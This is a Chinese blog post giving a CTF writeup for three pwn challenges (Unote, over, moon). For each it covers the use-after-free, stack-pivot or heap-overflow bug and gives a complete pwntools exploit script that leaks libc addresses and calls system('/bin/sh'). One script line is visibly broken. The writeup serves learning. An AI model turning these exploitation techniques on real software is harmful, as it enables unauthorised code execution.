<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 安恒杯第八次周周练writeup · foyjog</title><meta name="description" content="安恒杯第八次周周练writeup - foyjog"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://foyjog.github.io/atom.xml" title="foyjog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">主页</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">归档</a></li><li class="nav-list-item"><a href="https://github.com/foyjog" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">安恒杯第八次周周练writeup</h1><div class="post-info">Jul 16, 2018</div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多熟悉熟悉pwn类的题目.</p>
<h3 id="Unote"><a href="#Unote" class="headerlink" title="Unote"></a>Unote</h3><p>是一个32为的程序,checksec如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>拖进ida,程序比较简单,只有四个功能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        UNote         </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;g_str_name, <span class="number">30u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      welcome();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并不用花太多时间了解题目,认真分析分析,就能发现存在uaf的利用点.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A090 ptr             dd ?                    ; DATA XREF: add_note+3C↑r</span><br><span class="line">.bss:0804A090                                         ; add_note+5C↑w ...</span><br><span class="line">.bss:0804A094                 dd ?</span><br><span class="line">.bss:0804A098                 dd ?</span><br></pre></td></tr></table></figure></p>
<p>ptr数组是bss段,delete_note之后并不会删除ptr数组的引用,所以这里导致了uaf的漏洞所在.<br>整体的exp流程思路如下,比较简单:</p>
<ol>
<li>创建两个note</li>
<li>删除这两个note</li>
<li>创建第三个note,将其content的大小置为8,所以第三个note的ptr[2]等于ptr[1],ptr[2][1] = ptr[0]</li>
<li>因为可以控制content,所以将ptr[0]设置为\x72\x86\x04\x08\x70\xa0\x04\x08</li>
<li>前四个字节为sub_8048672,刚好是system()函数(其实发现这个函数题目的意图就很明显了)</li>
<li>后四个字节为我们的bss段的g_str_name,我们将其设为/bin/sh即可.</li>
<li>调用print_note(2),即调用system(“/bin/sh”)</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./Unote"</span>)</span><br><span class="line">p = process(<span class="string">"./Unote"</span>)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#alloc note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"135168"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#alloc note2</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"135168"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#delete note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#delete note2</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#alloc note3 ,buffer 8 to note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"8"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"\x72\x86\x04\x08\x70\xa0\x04\x08"</span>)<span class="comment">#system to puts</span></span><br><span class="line"><span class="comment">#puts to system</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="over"><a href="#over" class="headerlink" title="over"></a>over</h3><p>这个题目比较少,具体代码和信息如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400676</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">80u</span>LL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">96u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>很明显的一个栈一处,但是溢出只有16个字节,我们很可能会想到构造rop链,但是16个字节的溢出太少,所以这里利用一个技术叫做Stack Pivot,通过两次leave达到控制esp和ebp的效果.<br>思路如下:</p>
<ol>
<li>通过send()79个字节溢出并泄漏ebp的地址.</li>
<li>计算ebp和buf的offset,通过stack pivot将esp设置为buf的地址.</li>
<li>开始rop,第一次rop通过puts(puts_got)泄漏puts的libc地址,计算system和字符串/bin/sh地址.</li>
<li>第二次rop,执行system(“/bin/sh”)</li>
</ol>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>有点乱,将就看吧….ebp的地址设置动态调出来的,没算…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./over"</span>)</span><br><span class="line">p = process(<span class="string">"./over"</span>)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="comment">#staget 1 to leak ebppdb.set_trace()</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'A'</span>*<span class="number">79</span>)</span><br><span class="line">p.recv(<span class="number">80</span>)</span><br><span class="line">v_ebp =  u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leaked ebp :"</span>,hex(v_ebp)</span><br><span class="line"><span class="comment"># stage 2 to leak puts address</span></span><br><span class="line">p.recv()</span><br><span class="line">poprdi = p64(<span class="number">0x400793</span>)sh</span><br><span class="line">puts_gotplt = p64(<span class="number">0x601020</span>)</span><br><span class="line">puts_addr = p64(<span class="number">0x4006B9</span>)</span><br><span class="line">popret = p64(<span class="number">0x4006be</span>)</span><br><span class="line">payload2 = p64(v_ebp<span class="number">-0x50</span>)+poprdi+puts_gotplt + puts_addr+p64(v_ebp)+p64(<span class="number">0x400676</span>)+<span class="string">'A'</span>*<span class="number">32</span>+ p64(v_ebp<span class="number">-0x70</span>)+(popret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_libc_addr = u64(p.recv(<span class="number">6</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_libc_addr:"</span>,hex(puts_libc_addr)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment">#libc_2.23.so	00007FB7B4039000	00007FB7B40A8690</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">libc_puts_system_offset = <span class="number">0x7F449904E690</span> - <span class="number">0x7F4499024390</span></span><br><span class="line">libc_binsh_puts_offset = <span class="number">0x7F6B855B3D57</span> - <span class="number">0x7F6B85496690</span></span><br><span class="line">libc_binsh_address = puts_libc_addr+libc_binsh_puts_offset</span><br><span class="line">libc_system_address = puts_libc_addr - libc_puts_system_offset </span><br><span class="line">payload3 = p64(v_ebp<span class="number">-0x50</span>)+poprdi+p64(libc_binsh_address) + p64(libc_system_address)+<span class="string">'A'</span>*<span class="number">48</span>+ p64(v_ebp<span class="number">-0x98</span>)+(popret)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># system	7F4499024390</span></span><br><span class="line"><span class="comment"># puts	7F449904E690</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#binsh 00007F6B855B3D57</span></span><br><span class="line"><span class="comment">#puts	7F6B85496690</span></span><br></pre></td></tr></table></figure></p>
<h3 id="moon"><a href="#moon" class="headerlink" title="moon"></a>moon</h3><p>题目稍微多一点,但是利用起来也并不困难,查看代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">switch</span> ( get_choice() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      create();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      mydelete();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      edit();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      show();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      myexit();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"Sorry,Incorrect choice!\n"</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>认真分析一些代码,发现如下两个点:<br>show函数如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"which moon do you want to show:"</span>, <span class="number">0x1F</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"moon's id is worry\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write(<span class="number">1</span>, mo[v1], <span class="number">16u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>write(1, mo[v1], 16uLL);总是输出16位,这肯定有问题的.<br>再看edit函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"which moon do you want to edit:"</span>, <span class="number">0x1F</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> &amp;&amp; mo[v1] )</span><br><span class="line">    read_mbuf((__int64)mo[v1], <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"moon's id is worry\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>read_mbuf((__int64)mo[v1], 128);刚好溢出8个字节,覆盖free函数指针至system()即可,但是我们怎么得到system地址.<br>上面的show函数给我们提供了泄漏的机会,无论我们输入多少个字节,它都能输出16个字节.泄漏流程大致如下:</p>
<ol>
<li>申请一个moon</li>
<li>再申请一个moon</li>
<li>删除第一个moon,这个时候的话moon堆里面就变成了fd,bk都指向main_arena的malloc_state的top地址.</li>
<li>申请一个moon,占住删除的第一个moon,利用show进行泄漏即可.<br>原理一张图就能讲清楚.<br><img src="/img/arena.png" alt="arena.png"></li>
</ol>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./moon"</span>)</span><br><span class="line">p = process(<span class="string">"./moon"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createmoon</span><span class="params">(moon_name)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(moon_name)</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editmoon</span><span class="params">(id,moon_name)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">    p.send(moon_name)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletemoon</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showmoon</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">    tmp =  p.recv(<span class="number">8</span>)</span><br><span class="line">    addr = p.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">createmoon(<span class="string">"moon1"</span>)</span><br><span class="line">createmoon(<span class="string">"moon2"</span>)</span><br><span class="line">deletemoon(<span class="string">"0"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">createmoon(<span class="string">"moon3"</span>)</span><br><span class="line">ret_str = showmoon(<span class="string">"0"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">libc_malloc_state_top = u64(ret_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_malloc_state_top :"</span>,hex(libc_malloc_state_top)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_malloc_state_top off_7FABDEE46B78   libc_2.23.so	00007FABDEA82000	00007FABDEC42000	R	.	X	D	.	byte	0000	public	CODE	64	0000	0000	0000	0000	0000</span></span><br><span class="line">malloc_state_libc_offset = <span class="number">0x7FABDEE46B78</span> - <span class="number">0x7FABDEA82000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system	7EFD38522390 libc_2.23.so	00007EFD384DD000	00007EFD3869D000	R	.	X	D	.	byte	0000	public	CODE	64	0000	0000	0000	0000	0000</span></span><br><span class="line">system_libc_offset = <span class="number">0x7EFD38522390</span><span class="number">-0x7EFD384DD000</span></span><br><span class="line">libc_system_addr = libc_malloc_state_top - malloc_state_libc_offset + system_libc_offset</span><br><span class="line">createmoon(<span class="string">"moon4"</span>)</span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>+<span class="string">'A'</span>*<span class="number">112</span>+p64(libc_system_addr)</span><br><span class="line">editmoon(<span class="string">"0"</span>,payload)</span><br><span class="line">deletemoon(<span class="string">"0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://pan.baidu.com/s/16gD9t5SVkkIkMahElDaSMw" target="_blank" rel="noopener">https://pan.baidu.com/s/16gD9t5SVkkIkMahElDaSMw</a></p>
</div></article></div></main><footer><div class="paginator"><a href="/2018/07/30/macOS下利用VMware-Fusion进行linux内核调试/" class="prev">PREV</a><a href="/2018/07/05/Linux-Kernel-Exploitation-on-Linux-csaw2015/" class="next">NEXT</a></div><div class="copyright"><p>© 2017 - 2019 <a href="https://foyjog.github.io">foyjog</a></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>